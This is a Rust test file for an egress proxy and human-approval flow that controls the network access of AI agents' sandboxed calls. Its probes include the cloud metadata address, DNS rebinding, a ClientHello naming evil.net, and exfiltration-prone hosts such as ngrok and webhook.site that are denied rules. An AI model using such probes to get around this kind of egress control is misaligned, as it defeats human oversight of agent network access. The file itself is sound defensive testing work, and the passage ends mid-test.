    let request = asked["request_id"].as_str().unwrap().to_owned();
    let (driver_token, teammate_token, guest_token, admin_token, owner_token) = (
        fixture.session(driver).await,
        fixture.session(teammate).await,
        fixture.session(guest).await,
        fixture.session(admin).await,
        fixture.session(owner).await,
    );

    // The sandbox's own call token (an agent session) never reaches the card route: it cannot answer itself.
    let (status, _) = fixture
        .card(&token, &request, json!({ "answer": "allow_once" }))
        .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
    // The call's end lists the request, with when it stops waiting.
    let (_, ended) = fixture.end(&call, 10).await;
    assert_eq!(ended["egress_pending"][0]["id"], request.as_str());
    assert!(ended["egress_pending"][0]["expires_at"].as_i64().unwrap() > 0);

    // Who may click what.
    let once = json!({ "answer": "allow_once" });
    for (who, answer, status, code) in [
        (&guest_token, &once, StatusCode::NOT_FOUND, "not_found"),
        (
            &teammate_token,
            &once,
            StatusCode::FORBIDDEN,
            "egress_driver_only",
        ),
        (
            &admin_token,
            &once,
            StatusCode::FORBIDDEN,
            "egress_driver_only",
        ),
        (
            &driver_token,
            &json!({ "answer": "allow_always" }),
            StatusCode::FORBIDDEN,
            "egress_admin_only",
        ),
        (
            &teammate_token,
            &json!({ "answer": "deny" }),
            StatusCode::FORBIDDEN,
            "egress_driver_or_admin",
        ),
        (
            &driver_token,
            &json!({ "answer": "deny", "always": true }),
            StatusCode::FORBIDDEN,
            "egress_admin_only",
        ),
        (
            &driver_token,
            &json!({ "answer": "maybe" }),
            StatusCode::UNPROCESSABLE_ENTITY,
            "invalid_answer",
        ),
    ] {
        let (got, body) = fixture.card(who, &request, answer.clone()).await;
        assert_eq!(
            (got, body["code"].as_str()),
            (status, Some(code)),
            "{answer}"
        );
    }
    assert!(fixture.continuations(&thread).await.is_empty());

    // The driver allows once: the next call of this thread gets through, and the run goes on as theirs.
    let (status, body) = fixture.card(&driver_token, &request, once.clone()).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["status"], "allowed");
    let (status, body) = fixture.card(&driver_token, &request, once.clone()).await;
    assert_eq!(
        (status, body["code"].as_str()),
        (StatusCode::CONFLICT, Some("egress_request_answered"))
    );
    let continued = fixture.continuations(&thread).await;
    assert_eq!(continued.len(), 1);
    assert_eq!(continued[0].0, driver.to_string());
    assert_eq!(continued[0].1["type"], "egress");
    assert_eq!(continued[0].1["answer"], "allow_once");
    assert_eq!(continued[0].1["host"], "api.example.org");
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    let allowed = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    assert_eq!(allowed["decision"], "allow");
    assert_eq!(allowed["reason"], "allowed once in this thread");

    // An admin who is not the driver allows always: a rule, and the continuation is still the driver's.
    let other = fixture
        .check(&call, &password, "data.example.net", 443)
        .await;
    let (status, body) = fixture
        .card(
            &admin_token,
            other["request_id"].as_str().unwrap(),
            json!({ "answer": "allow_always" }),
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["rule"], "allow");
    let continued = fixture.continuations(&thread).await;
    assert_eq!(continued.len(), 2);
    assert_eq!(continued[1].0, driver.to_string());
    assert_eq!(continued[1].1["by"], "admin");
    assert_eq!(continued[1].1["by_driver"], false);
    assert_eq!(
        fixture
            .check(&call, &password, "data.example.net", 443)
            .await["reason"],
        "an allow rule"
    );

    // A risky host never gets a rule; the owner's Deny for this agent always makes a deny rule.
    let risky = fixture.check(&call, &password, "x.ngrok.io", 443).await;
    let risky = risky["request_id"].as_str().unwrap();
    let (status, body) = fixture
        .card(&owner_token, risky, json!({ "answer": "allow_always" }))
        .await;
    assert_eq!(
        (status, body["code"].as_str()),
        (StatusCode::CONFLICT, Some("egress_risky_host"))
    );
    let (status, body) = fixture
        .card(
            &owner_token,
            risky,
            json!({ "answer": "deny", "always": true }),
        )
        .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["rule"], "deny");
    assert_eq!(
        fixture.check(&call, &password, "x.ngrok.io", 443).await["reason"],
        "a deny rule"
    );

    let events = sqlx::query_scalar::<_, String>(
        "SELECT action FROM audit_events WHERE action LIKE 'agent_egress.%' ORDER BY id",
    )
    .fetch_all(fixture.database.pool())
    .await
    .unwrap();
    assert_eq!(
        events,
        [
            "agent_egress.allow_once",
            "agent_egress.rule_create",
            "agent_egress.rule_create"
        ]
    );
}

#[tokio::test]
async fn an_unanswered_card_expires_and_the_next_call_asks_again() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    let first = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    let request = first["request_id"].as_str().unwrap().to_owned();
    // The wait (30 minutes) is over.
    fixture
        .exec(
            "UPDATE agent_egress_requests SET expires_at = 1 WHERE id = $1",
            &[&request],
        )
        .await;
    let token = fixture.session(driver).await;
    let (status, body) = fixture
        .card(&token, &request, json!({ "answer": "allow_once" }))
        .await;
    assert_eq!(
        (status, body["code"].as_str()),
        (StatusCode::GONE, Some("egress_request_expired"))
    );
    assert!(fixture.continuations(&thread).await.is_empty());
    // The call's end no longer lists it; a new ask makes a new request, which waits again.
    let again = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    assert_eq!(again["decision"], "ask");
    assert_ne!(again["request_id"], first["request_id"]);
    let (_, ended) = fixture.end(&call, 0).await;
    let pending = ended["egress_pending"].as_array().unwrap();
    assert_eq!(pending.len(), 1);
    assert_eq!(pending[0]["id"], again["request_id"]);
}

#[tokio::test]
async fn the_sidecar_ends_an_interrupted_call_and_its_token_and_password_die() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, token, password) = fixture.call(driver, agent, &thread).await;
    assert_eq!(fixture.tasks_with(&token).await, StatusCode::OK);
    // Without a key: refused. The sidecar's end is an interruption, whatever it sends.
    let path = format!("/api/internal/agent/sandbox/calls/{call}/end");
    let (status, _) = fixture
        .request("POST", &path, "Bearer nope", Some(json!({})))
        .await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = fixture
        .request(
            "POST",
            &path,
            &format!("Bearer {SECRET}"),
            Some(json!({ "exit": 0, "cpu_ms": 999_999, "interrupted": "the run was stopped" })),
        )
        .await;
    assert_eq!(status, StatusCode::OK);
    let row = sqlx::query(
        "SELECT status, interrupted, cpu_ms, exit_code FROM agent_sandbox_calls WHERE id = $1",
    )
    .bind(&call)
    .fetch_one(fixture.database.pool())
    .await
    .unwrap();
    assert_eq!(row.get::<String, _>("status"), "done");
    assert_eq!(
        row.get::<Option<String>, _>("interrupted").as_deref(),
        Some("the run was stopped")
    );
    assert_eq!(row.get::<i64, _>("cpu_ms"), 0);
    assert_eq!(row.get::<Option<i64>, _>("exit_code"), None);
    assert_eq!(fixture.tasks_with(&token).await, StatusCode::UNAUTHORIZED);
    let decided = fixture
        .check(&call, &password, "api.example.org", 443)
        .await;
    assert_eq!(decided["decision"], "deny");
    assert_eq!(decided["reason"], "the call ended");
    // The broker's later end keeps the sidecar's end, but its CPU time counts, once (a retry adds nothing).
    for _ in 0..2 {
        let (status, _) = fixture.end(&call, 500).await;
        assert_eq!(status, StatusCode::OK);
    }
    assert_eq!(
        fixture.call_row(&call).await,
        (
            "done".to_owned(),
            Some("the run was stopped".to_owned()),
            500
        )
    );
    assert_eq!(fixture.usage(agent).await.0, 500);
}

mod proxy {
    use std::collections::HashMap;
    use std::io;
    use std::net::{IpAddr, SocketAddr};
    use std::path::Path;
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD;
    use futures_util::future::BoxFuture;
    use orbit_server::agent::egress_proxy::{Dialer, ProxyConfig, serve};
    use sha2::{Digest, Sha256};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::{TcpListener, TcpSocket, TcpStream};
    use tokio_util::sync::CancellationToken;

    use super::*;

    /// Fake DNS (counts lookups) and a dialer that sends every connection to a local echo server.
    pub struct FakeDialer {
        pub answers: HashMap<&'static str, Vec<IpAddr>>,
        pub resolved: Mutex<Vec<String>>,
        pub connected: Mutex<Vec<SocketAddr>>,
        pub echo: SocketAddr,
    }

    impl Dialer for FakeDialer {
        fn resolve<'a>(
            &'a self,
            host: &'a str,
            port: u16,
        ) -> BoxFuture<'a, io::Result<Vec<SocketAddr>>> {
            self.resolved.lock().unwrap().push(host.to_owned());
            let found = self.answers.get(host).map(|ips| {
                ips.iter()
                    .map(|ip| SocketAddr::new(*ip, port))
                    .collect::<Vec<_>>()
            });
            Box::pin(async move { found.ok_or_else(|| io::ErrorKind::NotFound.into()) })
        }

        fn connect(&self, address: SocketAddr) -> BoxFuture<'_, io::Result<TcpStream>> {
            self.connected.lock().unwrap().push(address);
            Box::pin(TcpStream::connect(self.echo))
        }
    }

    async fn echo_server() -> SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let address = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut stream, _)) = listener.accept().await {
                tokio::spawn(async move {
                    let (mut read, mut write) = stream.split();
                    let _ = tokio::io::copy(&mut read, &mut write).await;
                });
            }
        });
        address
    }

    pub struct Running {
        pub address: SocketAddr,
        pub dialer: Arc<FakeDialer>,
        pub calls: tempfile::TempDir,
        _stop: tokio_util::sync::DropGuard,
    }

    /// Orbit (the fixture's routes) on a port, and a proxy in front of it.
    pub async fn start(fixture: &Fixture, max_bytes: u64, max_connections: usize) -> Running {
        let orbit = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let orbit_address = orbit.local_addr().unwrap();
        let app = fixture.app.clone();
        tokio::spawn(async move { axum::serve(orbit, app).await });
        let dialer = Arc::new(FakeDialer {
            answers: HashMap::from([
                ("api.example.com", vec!["93.184.215.14".parse().unwrap()]),
                ("private.example.com", vec!["10.0.0.5".parse().unwrap()]),
                (
                    "rebind.example.com",
                    vec![
                        "93.184.215.14".parse().unwrap(),
                        "127.0.0.1".parse().unwrap(),
                    ],
                ),
                ("meta.example.com", vec!["169.254.169.254".parse().unwrap()]),
                ("ula.example.com", vec!["fd00::1".parse().unwrap()]),
            ]),
            resolved: Mutex::default(),
            connected: Mutex::default(),
            echo: echo_server().await,
        });
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let address = listener.local_addr().unwrap();
        let calls = tempfile::tempdir().unwrap();
        let stop = CancellationToken::new();
        let token = service_bearer().trim_start_matches("Bearer ").to_owned();
        tokio::spawn(serve(
            ProxyConfig {
                orbit_url: format!("http://{orbit_address}"),
                service_token: token,
                calls_dir: calls.path().to_owned(),
                orbit_internal: orbit_address,
                call_max_bytes: max_bytes,
                call_max_connections: max_connections,
            },
            Arc::clone(&dialer) as Arc<dyn Dialer>,
            listener,
            stop.clone(),
        ));
        Running {
            address,
            dialer,
            calls,
            _stop: stop.drop_guard(),
        }
    }

    /// What the broker writes for a running call.
    pub fn call_file(dir: &Path, call: &str, sandbox: &str, password: &str) {
        let hash: String = Sha256::digest(password.as_bytes())
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect();
        std::fs::write(
            dir.join(call),
            json!({ "addr": sandbox, "password_sha256": hash }).to_string(),
        )
        .unwrap();
    }

    /// A request from `source` with `call:password`. The status, the JSON body (when not 200), and the open
    /// stream after a 200.
    pub async fn send(
        proxy: SocketAddr,
        source: &str,
        credentials: (&str, &str),
        line: &str,
        extra: &str,
    ) -> (u16, Value, TcpStream) {
        let socket = TcpSocket::new_v4().unwrap();
        socket
            .bind(SocketAddr::new(source.parse().unwrap(), 0))
            .unwrap();
        let mut stream = socket.connect(proxy).await.unwrap();
        let auth = STANDARD.encode(format!("{}:{}", credentials.0, credentials.1));
        stream
            .write_all(
                format!("{line}\r\nHost: x\r\nProxy-Authorization: Basic {auth}\r\n{extra}\r\n")
                    .as_bytes(),
            )
            .await
            .unwrap();
        let mut head = Vec::new();
        while !head.ends_with(b"\r\n\r\n") {
            let mut byte = [0_u8; 1];
            if stream.read(&mut byte).await.unwrap() == 0 {
                break;
            }
            head.push(byte[0]);
        }
        let head = String::from_utf8(head).unwrap();
        let status: u16 = head
            .split(' ')
            .nth(1)
            .and_then(|code| code.parse().ok())
            .unwrap_or(0);
        if status == 200 && line.starts_with("CONNECT") {
            return (status, Value::Null, stream);
        }
        let mut body = Vec::new();
        let _ = tokio::time::timeout(Duration::from_secs(5), stream.read_to_end(&mut body)).await;
        (
            status,
            serde_json::from_slice(&body).unwrap_or(Value::Null),
            stream,
        )
    }

    /// A TLS ClientHello record that names `host`.
    pub fn hello(host: &str) -> Vec<u8> {
        let name = host.as_bytes();
        let n = u16::try_from(name.len()).unwrap();
        let mut sni = vec![0, 0];
        sni.extend_from_slice(&(n + 5).to_be_bytes());
        sni.extend_from_slice(&(n + 3).to_be_bytes());
        sni.push(0);
        sni.extend_from_slice(&n.to_be_bytes());
        sni.extend_from_slice(name);
        let mut body = vec![3, 3];
        body.extend_from_slice(&[7; 32]);
        body.extend_from_slice(&[0, 0, 2, 0x13, 0x01, 1, 0]);
        body.extend_from_slice(&u16::try_from(sni.len()).unwrap().to_be_bytes());
        body.extend_from_slice(&sni);
        let mut record = vec![22, 3, 1];
        record.extend_from_slice(&u16::try_from(body.len() + 4).unwrap().to_be_bytes());
        record.extend_from_slice(&[1, 0]);
        record.extend_from_slice(&u16::try_from(body.len()).unwrap().to_be_bytes());
        record.extend_from_slice(&body);
        record
    }

    /// Sends `payload` through an open tunnel and reads the echo back.
    pub async fn round_trip(stream: &mut TcpStream, payload: &[u8]) -> io::Result<Vec<u8>> {
        stream.write_all(payload).await?;
        let mut back = vec![0_u8; payload.len()];
        tokio::time::timeout(Duration::from_secs(5), stream.read_exact(&mut back))
            .await
            .map_err(|_| io::Error::from(io::ErrorKind::TimedOut))??;
        Ok(back)
    }

    /// Whether the proxy closed the tunnel (EOF or reset) within `wait`.
    pub async fn closed_within(stream: &mut TcpStream, wait: Duration) -> bool {
        let mut byte = [0_u8; 1];
        matches!(
            tokio::time::timeout(wait, stream.read(&mut byte)).await,
            Ok(Ok(0) | Err(_))
        )
    }
}

/// One log row of a call's connection to `host`, once the proxy reported it (or as it is after 5 s).
async fn logged(fixture: &Fixture, call: &str, host: &str) -> (String, i64, i64, bool) {
    for _ in 0..50 {
        let row = sqlx::query(
            "SELECT decision, bytes_up, bytes_down, done_at FROM agent_egress_log WHERE call_id = $1 AND host = $2 \
             ORDER BY id DESC LIMIT 1",
        )
        .bind(call)
        .bind(host)
        .fetch_one(fixture.database.pool())
        .await
        .unwrap();
        let done = row.get::<Option<i64>, _>("done_at").is_some();
        if done || row.get::<String, _>("decision") != "allow" {
            return (
                row.get("decision"),
                row.get("bytes_up"),
                row.get("bytes_down"),
                done,
            );
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    panic!("the proxy did not report the connection to {host}");
}

#[tokio::test]
async fn the_proxy_resolves_only_after_orbit_says_allow_reaches_only_public_addresses_and_counts_bytes()
 {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    fixture.rule(agent, "*.example.com", 443, "allow").await;
    let running = proxy::start(&fixture, 100 * 1024 * 1024, 20).await;
    proxy::call_file(running.calls.path(), &call, "127.0.0.1", &password);
    let connect = |target: &str| {
        let line = format!("CONNECT {target} HTTP/1.1");
        let (address, call, password) = (running.address, call.clone(), password.clone());
        async move { proxy::send(address, "127.0.0.1", (&call, &password), &line, "").await }
    };

    // No rule: Orbit asks; no IP literal; nothing resolved or dialed before a yes. Plain HTTP never.
    let (status, body, _) = connect("api.other.net:443").await;
    assert_eq!(
        (status, body["error"].as_str()),
        (403, Some("egress_approval_required"))
    );
    for target in [
        "1.1.1.1:443",
        "[::1]:443",
        "169.254.169.254:80",
        "orbit.example.com:443",
    ] {
        let (status, body, _) = connect(target).await;
        assert_eq!(
            (status, body["error"].as_str()),
            (403, Some("egress_denied")),
            "{target}"
        );
    }
    assert!(running.dialer.resolved.lock().unwrap().is_empty());
    assert!(running.dialer.connected.lock().unwrap().is_empty());
    let (status, body, _) = proxy::send(
        running.address,
        "127.0.0.1",
        (&call, &password),
        "GET http://api.example.com/ HTTP/1.1",
        "",
    )
    .await;
    assert_eq!(
        (status, body["error"].as_str()),
        (405, Some("connect_only"))
    );

    // Allowed: resolved, dialed at the checked address, the ClientHello passes, bytes are counted once.
    let (status, _, mut tunnel) = connect("API.Example.com:443").await;
    assert_eq!(status, 200);
    let hello = proxy::hello("api.example.com");
    assert_eq!(proxy::round_trip(&mut tunnel, &hello).await.unwrap(), hello);
    let payload = vec![b'x'; 5000];
    assert_eq!(
        proxy::round_trip(&mut tunnel, &payload).await.unwrap(),
        payload
    );
    drop(tunnel);
    let sent = i64::try_from(hello.len() + payload.len()).unwrap();
    assert_eq!(
        logged(&fixture, &call, "api.example.com").await,
        ("allow".to_owned(), sent, sent, true)
    );
    assert_eq!(
        *running.dialer.connected.lock().unwrap(),
        vec!["93.184.215.14:443".parse::<std::net::SocketAddr>().unwrap()]
    );
    let counted = sqlx::query(
        "SELECT c.egress_bytes, u.egress_bytes AS month FROM agent_sandbox_calls c \
         JOIN agent_sandbox_usage u ON u.agent_user_id = c.agent_user_id WHERE c.id = $1",
    )
    .bind(&call)
    .fetch_one(fixture.database.pool())
    .await
    .unwrap();
    assert_eq!(counted.get::<i64, _>("egress_bytes"), 2 * sent);
    assert_eq!(counted.get::<i64, _>("month"), 2 * sent);

    // Allowed by the rules, but private, link-local, unique-local, or one private answer among public ones (DNS
    // rebinding): blocked before any connect, and logged as blocked.
    for host in [
        "private.example.com",
        "meta.example.com",
        "ula.example.com",
        "rebind.example.com",
    ] {
        let (status, body, _) = connect(&format!("{host}:443")).await;
        assert_eq!(
            (status, body["error"].as_str()),
            (403, Some("egress_blocked")),
            "{host}"
        );
        assert_eq!(logged(&fixture, &call, host).await.0, "blocked", "{host}");
    }
    assert_eq!(running.dialer.connected.lock().unwrap().len(), 1);

    // A ClientHello for another name (or none): the tunnel closes; blocked.
    let (status, _, mut tunnel) = connect("api.example.com:443").await;
    assert_eq!(status, 200);
    tunnel.write_all(&proxy::hello("evil.net")).await.unwrap();
    assert!(proxy::closed_within(&mut tunnel, std::time::Duration::from_secs(5)).await);
    assert_eq!(
        logged(&fixture, &call, "api.example.com").await.0,
        "blocked"
    );
    let (status, _, mut tunnel) = connect("api.example.com:443").await;
    assert_eq!(status, 200);
    tunnel.write_all(b"GET / HTTP/1.1\r\n\r\n").await.unwrap();
    assert!(proxy::closed_within(&mut tunnel, std::time::Duration::from_secs(5)).await);

    // A retried byte report counts nothing twice.
    let log_id: String = sqlx::query_scalar(
        "SELECT id FROM agent_egress_log WHERE call_id = $1 AND decision = 'allow' AND done_at IS NOT NULL",
    )
    .bind(&call)
    .fetch_one(fixture.database.pool())
    .await
    .unwrap();
    let (status, again) = fixture
        .request(
            "POST",
            "/api/internal/agent/egress/done",
            &service_bearer(),
            Some(json!({ "log_id": log_id, "call_id": call, "bytes_up": 999, "bytes_down": 999, "duration_ms": 1 })),
        )
        .await;
    assert_eq!(
        (status, again["counted"].as_bool()),
        (StatusCode::OK, Some(false))
    );
}

#[tokio::test]
async fn a_proxy_password_works_only_for_its_running_call_and_from_its_own_sandbox() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let teammate = fixture.add_user("teammate", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let theirs = fixture.thread(agent, teammate, "running").await;
    let (call, token, password) = fixture.call(driver, agent, &thread).await;
    let (other, _, other_password) = fixture.call(teammate, agent, &theirs).await;
    fixture.rule(agent, "api.example.com", 443, "allow").await;
    let running = proxy::start(&fixture, 100 * 1024 * 1024, 20).await;
    proxy::call_file(running.calls.path(), &call, "127.0.0.1", &password);
    proxy::call_file(running.calls.path(), &other, "127.0.0.2", &other_password);
    let line = "CONNECT api.example.com:443 HTTP/1.1";
    let send = |source: &'static str, call: String, password: String| {
        let address = running.address;
        async move {
            proxy::send(address, source, (&call, &password), line, "")
                .await
                .0
        }
    };

    assert_eq!(
        send("127.0.0.1", call.clone(), "wrong".to_owned()).await,
        407
    );
    assert_eq!(
        send("127.0.0.1", call.clone(), other_password.clone()).await,
        407
    );
    // The other sandbox's own password, used from this sandbox's address.
    assert_eq!(
        send("127.0.0.1", other.clone(), other_password.clone()).await,
        407
    );
    assert_eq!(
        send("127.0.0.2", other.clone(), other_password.clone()).await,
        200
    );
    assert_eq!(send("127.0.0.1", call.clone(), password.clone()).await, 200);

    // orbit.internal reaches Orbit (no egress decision); the call token does the rest.
    let tasks = format!(
        "GET http://orbit.internal/api/v1/workspaces/{}/tasks HTTP/1.1",
        fixture.workspace_id
    );
    let (status, body, _) = proxy::send(
        running.address,
        "127.0.0.1",
        (&call, &password),
        &tasks,
        &format!("Authorization: Bearer {token}\r\n"),
    )
    .await;
    assert_eq!(status, 200, "{body}");
    // One request per connection: a pipelined second request never reaches Orbit; a raw tunnel to Orbit is egress.
    let mut stream = tokio::net::TcpStream::connect(running.address)
        .await
        .unwrap();
    let auth = base64::engine::general_purpose::STANDARD.encode(format!("{call}:{password}"));
    let one = format!(
        "{tasks}\r\nHost: orbit.internal\r\nProxy-Authorization: Basic {auth}\r\nAuthorization: Bearer {token}\r\n\r\n"
    );
    stream
        .write_all(format!("{one}{one}").as_bytes())
        .await
        .unwrap();
    let mut answer = String::new();
    tokio::io::AsyncReadExt::read_to_string(&mut stream, &mut answer)
        .await
        .unwrap();
    assert_eq!(answer.matches("HTTP/1.1 ").count(), 1, "{answer}");
    let (status, body, _) = proxy::send(
        running.address,
        "127.0.0.1",
        (&call, &password),
        "CONNECT orbit.internal:80 HTTP/1.1",
        "",
    )
    .await;
    assert_eq!(
        (status, body["error"].as_str()),
        (403, Some("egress_denied"))
    );

    // The call ends in Orbit while the broker's file is still there: Orbit refuses.
    let (_, _, mut relaying) =
        proxy::send(running.address, "127.0.0.1", (&call, &password), line, "").await;
    let hello = proxy::hello("api.example.com");
    proxy::round_trip(&mut relaying, &hello).await.unwrap();
    let (_, _, mut waiting) =
        proxy::send(running.address, "127.0.0.1", (&call, &password), line, "").await;
    fixture.end(&call, 0).await;
    let (status, body, _) =
        proxy::send(running.address, "127.0.0.1", (&call, &password), line, "").await;
    assert_eq!(
        (status, body["error"].as_str()),
        (403, Some("egress_denied"))
    );
    std::fs::remove_file(running.calls.path().join(&call)).unwrap();
    // The broker deletes the file: the password is dead, and open tunnels close within the sweep.
    assert!(proxy::closed_within(&mut relaying, std::time::Duration::from_secs(3)).await);
    assert!(proxy::closed_within(&mut waiting, std::time::Duration::from_secs(1)).await);
    assert_eq!(send("127.0.0.1", call.clone(), password.clone()).await, 407);
    let (status, _, _) = proxy::send(
        running.address,
        "127.0.0.1",
        (&call, &password),
        &tasks,
        &format!("Authorization: Bearer {token}\r\n"),
    )
    .await;
    assert_eq!(status, 407);
    // The other call is not affected.
    assert_eq!(
        send("127.0.0.2", other.clone(), other_password.clone()).await,
        200
    );
}

#[tokio::test]
async fn a_call_gets_at_most_its_bytes_and_connections_through_the_proxy() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    fixture.rule(agent, "api.example.com", 443, "allow").await;
    let running = proxy::start(&fixture, 4096, 2).await;
    proxy::call_file(running.calls.path(), &call, "127.0.0.1", &password);
    let connect = || {
        let (address, call, password) = (running.address, call.clone(), password.clone());
        async move {
            proxy::send(
                address,
                "127.0.0.1",
                (&call, &password),
                "CONNECT api.example.com:443 HTTP/1.1",
                "",
            )
            .await
        }
    };

    let (_, _, mut first) = connect().await;
    let (_, _, second) = connect().await;
    let (status, body, _) = connect().await;
    assert_eq!(
        (status, body["error"].as_str()),
        (403, Some("egress_limit"))
    );
    drop(second);
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    // Past 4096 bytes up and down together, the tunnel is cut and no new one opens.
    let hello = proxy::hello("api.example.com");
    proxy::round_trip(&mut first, &hello).await.unwrap();
    let _ = proxy::round_trip(&mut first, &[b'y'; 8000]).await;
    assert!(proxy::closed_within(&mut first, std::time::Duration::from_secs(3)).await);
    let (up, down) = {
        let (_, up, down, _) = logged(&fixture, &call, "api.example.com").await;
        (up, down)
    };
    assert!(up + down <= 4096 + 16 * 1024, "{up} + {down}");
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;
    let (status, body, _) = connect().await;
    assert_eq!(
        (status, body["error"].as_str()),
        (403, Some("egress_limit"))
    );
}

#[tokio::test]
async fn the_sandbox_migration_runs_after_productions_newest_migration() {
    // The catalog and its order are the same on Postgres; an own Postgres database here would stay behind.
    if orbit_platform::testing_postgres() {
        return;
    }
    // Production's newest migration when the sandbox migration was made (deployed 2026-11-18).
    const PRODUCTION: i64 = 20_261_118_104_258;
    const SANDBOX: i64 = 20_261_118_154_559;
    let directory = tempfile::tempdir().unwrap();
    let database = orbit_platform::Database::open(&orbit_platform::DatabaseConfig::new(
        directory.path().join("orbit.sqlite"),
    ))
    .await
    .unwrap();
    orbit_platform::MigrationRunner::embedded_through("test", PRODUCTION)
        .run(&database)
        .await
        .unwrap();
    let runner = orbit_platform::MigrationRunner::embedded("test");
    let pending: Vec<i64> = runner
        .pending(&database)
        .await
        .unwrap()
        .iter()
        .map(|migration| migration.version)
        .collect();
    assert!(pending.contains(&SANDBOX), "{pending:?}");
    assert!(
        pending.iter().all(|version| *version > PRODUCTION),
        "{pending:?}"
    );
    runner.run(&database).await.unwrap();
    sqlx::query("SELECT bytes_up, done_at FROM agent_egress_log")
        .fetch_all(database.pool())
        .await
        .unwrap();
}

/// The agent's profile id (the settings routes take it, as the agent card does).
async fn profile_of(fixture: &Fixture, agent: Id) -> String {
    sqlx::query_scalar::<_, String>("SELECT id FROM agent_profiles WHERE user_id = $1")
        .bind(agent.to_string())
        .fetch_one(fixture.database.pool())
        .await
        .unwrap()
}

/// The sidecar's card message for a call (nonce `egress:<call>`, by the agent, in the thread's conversation).
async fn card_message(fixture: &Fixture, agent: Id, call: &str) -> String {
    let id = Id::new_v7().to_string();
    sqlx::query(
        "INSERT INTO chat_messages (id, conversation_id, kind, author_id, body, nonce, created_at) \
         VALUES ($1, $2, 'message', $3, 'wants to connect', $4, $5)",
    )
    .bind(&id)
    .bind(&fixture.conversation)
    .bind(agent.to_string())
    .bind(format!("egress:{call}"))
    .bind(TimestampMillis::now().as_millis())
    .execute(fixture.database.pool())
    .await
    .unwrap();
    id
}

#[tokio::test]
async fn the_thread_card_shows_each_viewer_only_the_answers_they_may_give() {
    let fixture = Fixture::new().await;
    let driver = fixture.add_user("driver", Some("member")).await;
    let teammate = fixture.add_user("teammate", Some("member")).await;
    let guest = fixture.add_user("guest", Some("guest")).await;
    let outsider = fixture.add_user("outsider", None).await;
    let admin = fixture.add_user("admin", Some("admin")).await;
    let agent = fixture.add_agent(TOOLS, true).await;
    let thread = fixture.thread(agent, driver, "running").await;
    let (call, _, password) = fixture.call(driver, agent, &thread).await;
    for host in ["api.example.org", "old.example.org", "webhook.site"] {
        assert_eq!(
            fixture.check(&call, &password, host, 443).await["decision"],
            "ask"
        );
    }
    fixture.end(&call, 10).await;
    let message = card_message(&fixture, agent, &call).await;
    fixture
        .exec(
            "UPDATE agent_egress_requests SET expires_at = 1 WHERE host = $1",
            &["old.example.org"],
        )
        .await;
    let list = |token: String| {
        let fixture = &fixture;
        async move {
            fixture
                .request(
                    "GET",
                    &format!(
                        "/api/v1/workspaces/{}/agents/egress-requests?conversation_id={}",
                        fixture.workspace_id, fixture.conversation
                    ),
                    &format!("Bearer {token}"),
                    None,
                )
                .await
        }
    };
    let flags = |view: &Value, host: &str| {
        let row = view["requests"]
            .as_array()
            .unwrap()
            .iter()
            .find(|row| row["host"] == host)
            .unwrap()
            .clone();
        assert_eq!(row["message_id"], message.as_str());
        (
            row["status"].as_str().unwrap().to_owned(),
            row["can_allow_once"].as_bool().unwrap(),
            row["can_allow_always"].as_bool().unwrap(),
            row["can_deny"].as_bool().unwrap(),
        )
    };
    let pending = |once, always, deny| ("pending".to_owned(), once, always, deny);
    let expired = ("expired".to_owned(), false, false, false);

    let (status, view) = list(fixture.session(driver).await).await;
    assert_eq!(status, StatusCode::OK, "{view}");
    assert_eq!(view["requests"].as_array().unwrap().len(), 3);
    assert_eq!(flags(&view, "api.example.org"), pending(true, false, true));
    assert_eq!(flags(&view, "webhook.site"), pending(true, false, true));
    assert_eq!(flags(&view, "old.example.org"), expired);
    let (_, view) = list(fixture.session(admin).await).await;
    assert_eq!(flags(&view, "api.example.org"), pending(false, true, true));
    // A risky host never offers Allow always, also to admins.
    assert_eq!(flags(&view, "webhook.site"), pending(false, false, true));
    let teammate_token = fixture.session(teammate).await;
    let (_, view) = list(teammate_token.clone()).await;
    assert_eq!(
        flags(&view, "api.example.org"),
        pending(false, false, false)
    );
    assert_eq!(view["requests"][0]["driver_name"], "driver");
    // Guests and people outside the workspace see nothing.
    for user in [guest, outsider] {
        assert_eq!(
            list(fixture.session(user).await).await.0,
            StatusCode::NOT_FOUND
        );
    }

    // After an admin's Allow always, every viewer sees the answer, who gave it and the rule; no buttons.
